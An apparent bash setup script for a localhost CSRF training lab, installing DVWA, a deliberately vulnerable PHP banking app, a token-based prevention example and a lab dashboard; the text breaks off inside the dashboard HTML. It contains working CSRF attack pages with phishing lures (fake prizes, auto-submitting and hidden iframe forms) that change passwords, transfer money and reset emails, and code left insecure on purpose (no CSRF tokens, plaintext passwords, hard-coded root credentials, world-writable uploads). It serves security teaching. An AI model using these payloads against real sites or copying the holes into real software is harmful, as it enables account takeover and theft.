#!/bin/bash

# Cross-Site Request Forgery (CSRF) Attack Lab Setup Script
# Comprehensive CSRF demonstration with DVWA
# Compatible: Ubuntu, Kali Linux, Debian
# Version: 2.0

set -e

# Colors for output
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global variables
MYSQL_ROOT_PASSWORD="root123"
DVWA_DB_NAME="dvwa"
CSRF_DB_NAME="csrf_lab"

print_banner() {
    echo -e "${BLUE}"
    echo "================================================="
    echo "    CROSS-SITE REQUEST FORGERY (CSRF) LAB"
    echo "    Complete Attack Demonstration Environment"
    echo "================================================="
    echo -e "${NC}"
}

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_attack() {
    echo -e "${RED}[ATTACK]${NC} $1"
}

log_lab() {
    echo -e "${PURPLE}[LAB]${NC} $1"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root (use sudo)"
        exit 1
    fi
}

detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$NAME
        VER=$VERSION_ID
    else
        log_error "Cannot detect OS"
        exit 1
    fi
    log_info "Detected OS: $OS $VER"
}

update_system() {
    log_info "Updating system packages..."
    apt update && apt upgrade -y
    apt install -y curl wget git unzip net-tools
    log_info "System updated successfully"
}

install_lamp_stack() {
    log_info "Installing LAMP stack for CSRF lab..."
    
    # Install Apache, MySQL/MariaDB, PHP
    apt install -y apache2 mariadb-server mariadb-client
    apt install -y php php-mysqli php-gd php-curl php-json php-mbstring php-xml libapache2-mod-php
    
    # Enable and start services
    systemctl enable apache2 mariadb
    systemctl start apache2 mariadb
    
    log_info "LAMP stack installed successfully"
}

configure_mysql() {
    log_info "Configuring MySQL/MariaDB for CSRF lab..."
    
    # Set root password and secure installation
    mysql -u root <<EOF
ALTER USER 'root'@'localhost' IDENTIFIED BY '$MYSQL_ROOT_PASSWORD';
DELETE FROM mysql.user WHERE User='';
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';
FLUSH PRIVILEGES;
EOF
    
    log_info "MySQL configured with root password: $MYSQL_ROOT_PASSWORD"
}

setup_dvwa() {
    log_lab "Setting up DVWA for CSRF attack demonstration..."
    
    cd /tmp
    
    # Download DVWA if not exists
    if [ ! -d "DVWA" ]; then
        git clone https://github.com/digininja/DVWA.git
    fi
    
    # Move to web directory
    cp -r DVWA /var/www/html/dvwa
    chown -R www-data:www-data /var/www/html/dvwa
    chmod -R 755 /var/www/html/dvwa
    
    # Configure DVWA
    cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php
    
    # Set database credentials
    sed -i "s/\$_DVWA\['db_password'\] = '';/\$_DVWA['db_password'] = '$MYSQL_ROOT_PASSWORD';/g" /var/www/html/dvwa/config/config.inc.php
    sed -i "s/\$_DVWA\['db_user'\] = 'dvwa';/\$_DVWA['db_user'] = 'root';/g" /var/www/html/dvwa/config/config.inc.php
    
    # Create DVWA database
    mysql -u root -p"$MYSQL_ROOT_PASSWORD" -e "CREATE DATABASE IF NOT EXISTS $DVWA_DB_NAME;"
    mysql -u root -p"$MYSQL_ROOT_PASSWORD" -e "GRANT ALL PRIVILEGES ON $DVWA_DB_NAME.* TO 'root'@'localhost';"
    mysql -u root -p"$MYSQL_ROOT_PASSWORD" -e "FLUSH PRIVILEGES;"
    
    # Set proper permissions
    mkdir -p /var/www/html/dvwa/hackable/uploads
    chmod 777 /var/www/html/dvwa/hackable/uploads
    chmod 666 /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt 2>/dev/null || true
    
    log_lab "DVWA setup complete for CSRF testing"
}

create_csrf_attack_pages() {
    log_attack "Creating malicious CSRF attack pages..."
    
    # Create attacker's directory
    mkdir -p /var/www/html/attacker
    
    # 1. Basic CSRF Attack - Password Change
    cat > /var/www/html/attacker/csrf_password_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Win a FREE iPhone 15!</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #ff6b6b, #ffd93d);
            padding: 50px; 
            text-align: center;
        }
        .prize-container { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            max-width: 600px;
            margin: 0 auto;
        }
        .prize-title { 
            color: #ff6b6b; 
            font-size: 2.5em; 
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        .prize-description { 
            font-size: 1.2em; 
            margin: 20px 0; 
            color: #333;
        }
        .claim-button { 
            background: #ff6b6b; 
            color: white; 
            padding: 15px 30px; 
            font-size: 1.5em; 
            border: none; 
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
        }
        .claim-button:hover { 
            background: #ff5252; 
            transform: translateY(-2px);
            box-shadow: 0 7px 20px rgba(255, 107, 107, 0.6);
        }
        .hidden-form { display: none; }
        .terms { font-size: 0.8em; color: #666; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="prize-container">
        <h1 class="prize-title">🎉 CONGRATULATIONS! 🎉</h1>
        <p class="prize-description">
            You've been selected to win a <strong>FREE iPhone 15 Pro Max</strong>!<br>
            Simply click the button below to claim your prize instantly!
        </p>
        
        <!-- Hidden CSRF Attack Form -->
        <form class="hidden-form" action="http://localhost/dvwa/vulnerabilities/csrf/" method="POST" id="csrf-form">
            <input type="hidden" name="password_new" value="hacked123">
            <input type="hidden" name="password_conf" value="hacked123">
            <input type="hidden" name="Change" value="Change">
        </form>
        
        <!-- Visible decoy button -->
        <button class="claim-button" onclick="executeCSRF()">🎁 CLAIM YOUR PRIZE NOW! 🎁</button>
        
        <p class="terms">* No purchase necessary. Must be 18 or older. Valid while supplies last.</p>
    </div>
    
    <script>
    function executeCSRF() {
        alert("Processing your prize claim...");
        document.getElementById('csrf-form').submit();
    }
    </script>
</body>
</html>
EOF

    # 2. Auto-submit CSRF Attack (more stealthy)
    cat > /var/www/html/attacker/csrf_auto_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Loading Your Content...</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f5f5f5; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Loading your content, please wait...</p>
    </div>
    
    <!-- Auto-executing CSRF Attack -->
    <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="POST" id="auto-csrf" style="display:none;">
        <input type="hidden" name="password_new" value="auto_hacked">
        <input type="hidden" name="password_conf" value="auto_hacked">
        <input type="hidden" name="Change" value="Change">
    </form>
    
    <script>
    // Auto-submit after 2 seconds (appears like loading)
    setTimeout(function() {
        document.getElementById('auto-csrf').submit();
    }, 2000);
    </script>
</body>
</html>
EOF

    # 3. Image-based CSRF Attack (using GET request)
    cat > /var/www/html/attacker/csrf_image_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Funny Cat Pictures!</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 30px; background: #fff8f0; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .cat-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .cat-image { width: 100%; height: 200px; object-fit: cover; border-radius: 8px; }
        h1 { text-align: center; color: #ff6b47; }
    </style>
</head>
<body>
    <h1>🐱 Adorable Cat Gallery 🐱</h1>
    <div class="gallery">
        <div class="cat-card">
            <img src="https://placekitten.com/300/200" alt="Cute cat 1" class="cat-image">
            <h3>Fluffy the Magnificent</h3>
            <p>This adorable cat loves to play with yarn balls!</p>
        </div>
        
        <div class="cat-card">
            <img src="https://placekitten.com/301/200" alt="Cute cat 2" class="cat-image">
            <h3>Whiskers McFluff</h3>
            <p>Known for exceptional napping skills and tuna preferences.</p>
        </div>
        
        <div class="cat-card">
            <img src="https://placekitten.com/302/200" alt="Cute cat 3" class="cat-image">
            <h3>Shadow the Sneaky</h3>
            <p>Expert in hiding in cardboard boxes of all sizes.</p>
        </div>
    </div>
    
    <!-- Hidden CSRF attack using image loading (for GET-based CSRF) -->
    <!-- Note: This example shows the concept, but DVWA CSRF uses POST -->
    <img src="http://localhost/csrf_lab/vulnerable_endpoint.php?action=change_email&email=hacked@evil.com" 
         style="display:none;" alt="CSRF Attack" onerror="console.log('CSRF attempt executed')">
    
    <!-- Iframe-based CSRF for POST requests -->
    <iframe src="csrf_iframe_attack.html" style="display:none;" width="0" height="0"></iframe>
</body>
</html>
EOF

    # 4. Iframe-based CSRF Attack
    cat > /var/www/html/attacker/csrf_iframe_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>CSRF via iframe</title></head>
<body>
    <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="POST" id="iframe-csrf">
        <input type="hidden" name="password_new" value="iframe_hacked">
        <input type="hidden" name="password_conf" value="iframe_hacked">
        <input type="hidden" name="Change" value="Change">
    </form>
    
    <script>
    // Auto-submit when iframe loads
    document.getElementById('iframe-csrf').submit();
    </script>
</body>
</html>
EOF

    log_attack "Malicious CSRF attack pages created"
}

create_vulnerable_csrf_app() {
    log_lab "Creating additional vulnerable CSRF application..."
    
    # Create CSRF lab database and table
    mysql -u root -p"$MYSQL_ROOT_PASSWORD" <<EOF
CREATE DATABASE IF NOT EXISTS $CSRF_DB_NAME;
USE $CSRF_DB_NAME;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL,
    password VARCHAR(255) NOT NULL,
    balance DECIMAL(10,2) DEFAULT 1000.00,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT IGNORE INTO users (id, username, email, password, balance) VALUES
(1, 'alice', 'alice@example.com', 'password123', 1000.00),
(2, 'bob', 'bob@example.com', 'password123', 2500.00),
(3, 'charlie', 'charlie@example.com', 'password123', 750.00);

CREATE TABLE IF NOT EXISTS transactions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    from_user INT,
    to_user INT,
    amount DECIMAL(10,2),
    description TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (from_user) REFERENCES users(id),
    FOREIGN KEY (to_user) REFERENCES users(id)
);
EOF

    # Create CSRF lab directory
    mkdir -p /var/www/html/csrf_lab
    
    # Vulnerable banking app - Login page
    cat > /var/www/html/csrf_lab/login.php << 'EOF'
<?php
session_start();
$conn = mysqli_connect("localhost", "root", "root123", "csrf_lab");

if ($_POST) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $query = "SELECT id, username, email, balance FROM users WHERE username=? AND password=?";
    $stmt = $conn->prepare($query);
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows > 0) {
        $user = $result->fetch_assoc();
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['email'] = $user['email'];
        $_SESSION['balance'] = $user['balance'];
        header("Location: dashboard.php");
        exit;
    } else {
        $error = "Invalid credentials";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>SecureBank - Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 50px; }
        .login-container { background: white; padding: 40px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .logo { text-align: center; color: #2c3e50; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #2980b9; }
        .error { color: red; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2 class="logo">🏦 SecureBank</h2>
        <?php if (isset($error)) echo "<p class='error'>$error</p>"; ?>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" value="alice" required>
            <input type="password" name="password" placeholder="Password" value="password123" required>
            <button type="submit">Login</button>
        </form>
        <p style="text-align: center; margin-top: 20px; font-size: 0.9em; color: #666;">
            Demo credentials: alice/password123, bob/password123
        </p>
    </div>
</body>
</html>
EOF

    # Vulnerable banking app - Dashboard (CSRF vulnerable)
    cat > /var/www/html/csrf_lab/dashboard.php << 'EOF'
<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit;
}

$conn = mysqli_connect("localhost", "root", "root123", "csrf_lab");
$message = "";

// Process fund transfer (VULNERABLE - No CSRF protection)
if ($_POST && isset($_POST['transfer'])) {
    $to_username = $_POST['to_username'];
    $amount = floatval($_POST['amount']);
    $description = $_POST['description'];
    $from_user_id = $_SESSION['user_id'];
    
    // Get recipient user ID
    $query = "SELECT id FROM users WHERE username=?";
    $stmt = $conn->prepare($query);
    $stmt->bind_param("s", $to_username);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows > 0) {
        $recipient = $result->fetch_assoc();
        $to_user_id = $recipient['id'];
        
        // Check balance
        $query = "SELECT balance FROM users WHERE id=?";
        $stmt = $conn->prepare($query);
        $stmt->bind_param("i", $from_user_id);
        $stmt->execute();
        $result = $stmt->get_result();
        $user = $result->fetch_assoc();
        
        if ($user['balance'] >= $amount) {
            // Perform transfer
            mysqli_begin_transaction($conn);
            
            // Deduct from sender
            $query = "UPDATE users SET balance = balance - ? WHERE id = ?";
            $stmt = $conn->prepare($query);
            $stmt->bind_param("di", $amount, $from_user_id);
            $stmt->execute();
            
            // Add to recipient
            $query = "UPDATE users SET balance = balance + ? WHERE id = ?";
            $stmt = $conn->prepare($query);
            $stmt->bind_param("di", $amount, $to_user_id);
            $stmt->execute();
            
            // Log transaction
            $query = "INSERT INTO transactions (from_user, to_user, amount, description) VALUES (?, ?, ?, ?)";
            $stmt = $conn->prepare($query);
            $stmt->bind_param("iids", $from_user_id, $to_user_id, $amount, $description);
            $stmt->execute();
            
            mysqli_commit($conn);
            
            // Update session balance
            $query = "SELECT balance FROM users WHERE id=?";
            $stmt = $conn->prepare($query);
            $stmt->bind_param("i", $from_user_id);
            $stmt->execute();
            $result = $stmt->get_result();
            $user = $result->fetch_assoc();
            $_SESSION['balance'] = $user['balance'];
            
            $message = "<div style='color: green;'>Transfer successful! Sent $" . number_format($amount, 2) . " to $to_username</div>";
        } else {
            $message = "<div style='color: red;'>Insufficient funds!</div>";
        }
    } else {
        $message = "<div style='color: red;'>Recipient not found!</div>";
    }
}

// Process email change (VULNERABLE - No CSRF protection)
if ($_POST && isset($_POST['change_email'])) {
    $new_email = $_POST['new_email'];
    $user_id = $_SESSION['user_id'];
    
    $query = "UPDATE users SET email=? WHERE id=?";
    $stmt = $conn->prepare($query);
    $stmt->bind_param("si", $new_email, $user_id);
    $stmt->execute();
    
    $_SESSION['email'] = $new_email;
    $message = "<div style='color: green;'>Email updated successfully!</div>";
}

// Get recent transactions
$query = "SELECT t.*, u1.username as from_username, u2.username as to_username 
          FROM transactions t 
          JOIN users u1 ON t.from_user = u1.id 
          JOIN users u2 ON t.to_user = u2.id 
          WHERE t.from_user = ? OR t.to_user = ? 
          ORDER BY t.created_at DESC LIMIT 5";
$stmt = $conn->prepare($query);
$stmt->bind_param("ii", $_SESSION['user_id'], $_SESSION['user_id']);
$stmt->execute();
$transactions = $stmt->get_result();
?>
<!DOCTYPE html>
<html>
<head>
    <title>SecureBank - Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }
        .header { background: #2c3e50; color: white; padding: 20px; margin-bottom: 30px; border-radius: 8px; }
        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; max-width: 1200px; }
        .card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .balance { font-size: 2em; color: #27ae60; font-weight: bold; }
        input, textarea { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { padding: 12px 20px; background: #3498db; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #2980b9; }
        .danger-btn { background: #e74c3c; }
        .danger-btn:hover { background: #c0392b; }
        .transaction { padding: 10px; border-bottom: 1px solid #eee; }
        .logout { float: right; }
    </style>
</head>
<body>
    <div class="header">
        <h2>🏦 SecureBank Dashboard</h2>
        <p>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?>! 
        <a href="logout.php" class="logout" style="color: #ecf0f1;">Logout</a></p>
    </div>
    
    <?php echo $message; ?>
    
    <div class="dashboard">
        <div class="card">
            <h3>💰 Account Balance</h3>
            <div class="balance">$<?php echo number_format($_SESSION['balance'], 2); ?></div>
            <p>Current email: <?php echo htmlspecialchars($_SESSION['email']); ?></p>
        </div>
        
        <div class="card">
            <h3>💸 Transfer Funds (CSRF Vulnerable)</h3>
            <form method="POST">
                <input type="text" name="to_username" placeholder="Recipient username" required>
                <input type="number" name="amount" placeholder="Amount" step="0.01" min="0.01" required>
                <textarea name="description" placeholder="Description (optional)"></textarea>
                <button type="submit" name="transfer" class="danger-btn">Transfer Money</button>
            </form>
        </div>
        
        <div class="card">
            <h3>📧 Change Email (CSRF Vulnerable)</h3>
            <form method="POST">
                <input type="email" name="new_email" placeholder="New email address" required>
                <button type="submit" name="change_email">Update Email</button>
            </form>
        </div>
        
        <div class="card">
            <h3>📊 Recent Transactions</h3>
            <?php while ($tx = $transactions->fetch_assoc()): ?>
                <div class="transaction">
                    <strong><?php echo $tx['from_username'] == $_SESSION['username'] ? 'Sent' : 'Received'; ?></strong>
                    $<?php echo number_format($tx['amount'], 2); ?>
                    <?php if ($tx['from_username'] == $_SESSION['username']): ?>
                        to <?php echo htmlspecialchars($tx['to_username']); ?>
                    <?php else: ?>
                        from <?php echo htmlspecialchars($tx['from_username']); ?>
                    <?php endif; ?>
                    <br><small><?php echo $tx['created_at']; ?></small>
                </div>
            <?php endwhile; ?>
        </div>
    </div>
    
    <div style="background: #fff3cd; padding: 15px; margin: 30px 0; border-radius: 8px; border-left: 4px solid #ffc107;">
        <h4>⚠️ CSRF Vulnerability Notice</h4>
        <p>This application is intentionally vulnerable to CSRF attacks for educational purposes. 
        In a real application, you would implement CSRF tokens and other protections.</p>
    </div>
</body>
</html>
EOF

    # Logout functionality
    cat > /var/www/html/csrf_lab/logout.php << 'EOF'
<?php
session_start();
session_destroy();
header("Location: login.php");
exit;
?>
EOF

    # CSRF Attack targeting the banking app
    cat > /var/www/html/attacker/csrf_bank_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>URGENT: Claim Your $1000 Bonus!</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #2ecc71, #27ae60);
            padding: 50px; 
            color: white;
        }
        .bonus-container { 
            background: rgba(255,255,255,0.95); 
            color: #333;
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
        }
        .urgent { color: #e74c3c; font-weight: bold; font-size: 1.2em; }
        .bonus-amount { font-size: 3em; color: #27ae60; font-weight: bold; margin: 20px 0; }
        .claim-button { 
            background: #e74c3c; 
            color: white; 
            padding: 20px 40px; 
            font-size: 1.3em; 
            border: none; 
            border-radius: 50px;
            cursor: pointer;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="bonus-container">
        <p class="urgent">⏰ LIMITED TIME OFFER - EXPIRES IN 5 MINUTES!</p>
        <h1>Congratulations! You've Won!</h1>
        <div class="bonus-amount">$1,000</div>
        <p>Your account has been selected for an exclusive bonus!</p>
        <p><strong>Click below to claim your bonus instantly!</strong></p>
        
        <!-- Hidden CSRF forms -->
        <form style="display:none" action="http://localhost/csrf_lab/dashboard.php" method="POST" id="transfer-attack">
            <input type="hidden" name="to_username" value="charlie">
            <input type="hidden" name="amount" value="500">
            <input type="hidden" name="description" value="Bonus processing fee">
            <input type="hidden" name="transfer" value="1">
        </form>
        
        <form style="display:none" action="http://localhost/csrf_lab/dashboard.php" method="POST" id="email-attack">
            <input type="hidden" name="new_email" value="hacker@evil.com">
            <input type="hidden" name="change_email" value="1">
        </form>
        
        <button class="claim-button" onclick="claimBonus()">🎁 CLAIM $1,000 BONUS NOW! 🎁</button>
        
        <p style="font-size: 0.8em; margin-top: 20px;">* Bonus will be credited to your account within 24 hours</p>
    </div>
    
    <script>
    function claimBonus() {
        alert("Processing your bonus...");
        // Execute both CSRF attacks
        document.getElementById('transfer-attack').submit();
        setTimeout(function() {
            document.getElementById('email-attack').submit();
        }, 1000);
    }
    </script>
</body>
</html>
EOF

    log_lab "Vulnerable CSRF banking application created"
}

create_csrf_prevention_examples() {
    log_info "Creating CSRF prevention examples..."
    
    mkdir -p /var/www/html/secure
    
    # Secure version with CSRF tokens
    cat > /var/www/html/secure/csrf_secure_example.php << 'EOF'
<?php
session_start();

// Generate CSRF token
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$message = "";
$conn = mysqli_connect("localhost", "root", "root123", "csrf_lab");

// Process form with CSRF protection
if ($_POST) {
    // Verify CSRF token
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $message = "<div style='color: red; padding: 10px; background: #ffebee; border-radius: 4px;'>
                   ❌ CSRF token validation failed! Request blocked.</div>";
    } else {
        // Process legitimate request
        if (isset($_POST['change_email'])) {
            $new_email = $_POST['new_email'];
            $message = "<div style='color: green; padding: 10px; background: #e8f5e8; border-radius: 4px;'>
                       ✅ Email would be updated to: " . htmlspecialchars($new_email) . "</div>";
        }
        
        // Generate new token after successful request
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Protection Example</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 40px; background: #f8f9fa; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
        .secure { border-left: 4px solid #28a745; padding-left: 20px; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { padding: 12px 24px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .token-display { background: #f8f9fa; padding: 15px; border-radius: 4px; margin: 15px 0; font-family: monospace; word-break: break-all; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔒 CSRF Protection Example</h2>
        
        <?php echo $message; ?>
        
        <div class="secure">
            <h3>Secure Email Change Form</h3>
            <p>This form includes CSRF protection:</p>
            
            <form method="POST">
                <input type="email" name="new_email" placeholder="New email address" required>
                <!-- CSRF token hidden field -->
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <button type="submit" name="change_email">Update Email (Secure)</button>
            </form>
            
            <div class="token-display">
                <strong>Current CSRF Token:</strong><br>
                <?php echo $_SESSION['csrf_token']; ?>
            </div>
        </div>
        
        <div style="background: #fff3cd; padding: 20px; border-radius: 8px; margin: 20px 0;">
            <h4>🛡️ CSRF Protection Mechanisms Used:</h4>
            <ul>
                <li><strong>CSRF Tokens:</strong> Unique token per session</li>
                <li><strong>Token Validation:</strong> Server verifies token on each request</li>
                <li><strong>Token Regeneration:</strong> New token after successful request</li>
                <li><strong>SameSite Cookies:</strong> (Would be implemented in production)</li>
                <li><strong>Referer Validation:</strong> (Additional layer)</li>
            </ul>
        </div>
    </div>
</body>
</html>
EOF

    log_info "CSRF prevention examples created"
}

create_main_dashboard() {
    log_info "Creating comprehensive CSRF lab dashboard..."
    
    cat > /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Laboratory</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { 
            background: white; 
            padding: 40px; 
            text-align: center; 
            border-radius: 15px; 
            margin-bottom: 30px; 
            box-shadow: 0 8px 16px rgba(0,0,0,0.1); 
        }
        .lab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
        .lab-card { 
            background: white; 
            padding: 30px; 
            border-radius: 15px; 
            box-shadow: 0 8px 16px rgba(0,0,0,0.1); 
        }
        .vulnerable { border-left: 6px solid #e74c3c; }
        .attack { border-left: 6px solid #f39c12; }
        .secure { border-left: 6px solid #27ae60; }
        .lab-title { color: #2c3e50; margin-bottom: 15px; }
        .lab-links { margin: 15px 0; }
        .lab-links a { 
            display: inline-block; 
            margin: 8px 8px 8px 0; 
            padding: 10px 20px; 
            background: #3498db; 
            color: white; 
            text-decoration: none; 
            border-radius: 25px; 
            transition: all 0.3s ease;
        }
        .lab-links a:hover { background: #2980b9; transform: translateY(-2px); }
        .attack-link { background: #e74c3c !important; }
        .attack-link:hover { background: #c0392b !important; }
        .secure-link { background: #27ae60 !important; }
        .secure-link:hover { background: #229954 !important; }
        .instructions { 
            background: #f8f9fa; 
            padding: 25px; 
            border-radius: 10px; 
            margin: 25px 0; 
            border-left: 4px solid #3498db;
        }
        .warning { 
            background: #fff3cd; 
            padding: 20px; 
            border-radius: 10px; 
            margin: 20px 0; 
            border-left: 4px solid #ffc107;
        }
        .payload-box { 
            background: #f1f2f6; 
            padding: 15px; 
            border-radius: 8px; 
            font-family: monospace; 
            margin: 10px 0;
            border: 1px solid #ddd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Cross-Site Request Forgery (CSRF) Attack Laboratory</h1>
            <p>Complete demonstration environment for CSRF attack techniques and prevention</p>
            <p style="color: #7f8c8d;">Educational purpose only - All applications are intentionally vulnerable</p>
        </div>
        
        <div class="instructions">
            <h3>🔍 CSRF Attack Lab Instructions</h3>
            <ol>
                <li><strong>Setup Burp Suite:</strong> Configure proxy on 127.0.0.1:8080</li>
                <li><strong>Login to vulnerable apps:</strong> Use provided credentials</li>
                <li><strong>Capture legitimate requests:</strong> Use Burp to see the request structure</li>
                <li><strong>Visit attack pages:</strong> See how CSRF attacks work</li>
                <li><strong>Analyze the impact:</strong> Check how user data/actions were modified</li>
                <li><strong>Study prevention:</strong> Compare with secure implementations</li>
            </ol>
        </div>
        
        <div class="lab-grid">
            <div class="lab-card vulnerable">
                <h3 class="lab-title">🎯 DVWA CSRF Module</h3>
                <p><strong>Objective:</strong> Classic CSRF attack on password change functionality</p>
                <p><strong>Credentials:</strong> admin / password</p>
                <div class="lab-links">
                    <a href="/dvwa/" target="_blank">DVWA Login</a>
                    <a href="/dvwa/vulnerabilities/csrf/" target="_blank">CSRF Module</a>
                </div>
                <div class="payload-box">
                    <strong>Test Steps:</strong><br>
                    1. Login to DVWA<br>
                    2. Go to CSRF section<br>
                    3. Change password and capture request<br>
                    4. Create malicious form with captured data
                </div>
            </div>
            
            <div class="lab-card vulnerable">
                <h3 class="lab-title">🏦 Vulnerable Banking App</h3>
                <p><strong>Objective:</strong> CSRF attacks on money transfer and email change</p>
                <p><strong>Credentials:</strong> alice/password123, bob/password123</p>
                <div class="lab-links">
                    <a href="/csrf_lab/login.php" target="_blank">Banking Login</a>
                    <a href="/csrf_lab/dashboard.php" target="_blank">Dashboard</a>
                </div>
                <div class="payload-box">
                    <strong>Vulnerable Actions:</strong><br>
                    • Money transfers ($1000 starting balance)<br>
                    • Email address changes<br>
                    • No CSRF tokens implemented
                </div>
            </div>
            
            <div class="lab-card attack">
                <h3 class="lab-title">🚨 CSRF Attack Pages</h3>
                <p><strong>Objective:</strong> Malicious pages that execute CSRF attacks</p>
                <p><strong>Warning:</strong> Only visit these after logging into target apps!</p>
                <div class="lab-links">
                    <a href="/attacker/csrf_password_attack.html" target="_blank" class="attack-link">Prize CSRF</a>
                    <a href="/attacker/csrf_auto_attack.html" target="_blank" class="attack-link">Auto CSRF</a>
                    <a href="/attacker/csrf_bank_attack.html" target="_blank" class="attack-link">Banking CSRF</a>
                    <a href="/attacker/csrf_image_attack.html" target="_blank" class="attack-link">Image CSRF</a>
                </div>
                <div class="payload-box">
                    <strong>Attack Techniques:</strong><br>
                    • Social engineering (fake prizes)<br>
                    • Auto-submitting forms<br>
                    • Hidden iframe attacks<br>
                    • Image-based GET requests
                </div>
            </div>
            
            <div class="lab-card secure">
                <h3 class="lab-title">🔒 CSRF Prevention Examples</h3>
                <p><strong>Objective:</strong> Learn how to properly defend against CSRF attacks</p>
                <p><strong>Features:</strong> CSRF tokens, validation, secure coding</p>
                <div class="lab-links">
